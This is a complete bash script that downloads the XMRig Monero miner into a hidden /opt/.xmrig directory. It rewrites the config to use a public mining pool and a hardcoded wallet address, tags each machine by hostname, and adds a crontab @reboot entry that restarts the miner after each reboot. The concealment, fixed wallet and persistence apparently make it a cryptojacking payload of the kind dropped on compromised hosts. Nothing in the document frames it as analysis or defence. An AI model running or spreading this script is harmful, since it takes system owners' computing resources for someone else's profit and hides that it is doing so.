#!/bin/env bash

mkdir -p /opt/.xmrig
cd /opt/.xmrig/
wget https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-noble-x64.tar.gz
tar -xzf xmrig-6.22.1-noble-x64.tar.gz
cd xmrig-6.22.1/
sed -i 's/donate.v2.xmrig.com:3333/pool.supportxmr.com:3333/g' config.json
sed -i 's/YOUR_WALLET_ADDRESS/82ZkM2UFfV4HY6eRHEDv1pNCyAj2Bg9BPbSeUe3H6A3k9pCtLdhsriaZcriFaXbVmaMuAw9x9ezi4BTK47bE5yw84M1vJpp/g' config.json
sed -i "s/\"pass\": \"x\"/\"pass\": \"$(hostname)\"/g" config.json
(crontab -l 2>/dev/null; echo "@reboot /opt/.xmrig/xmrig-6.22.1/xmrig --config=/opt/.xmrig/xmrig-6.22.1/config.json") | crontab -
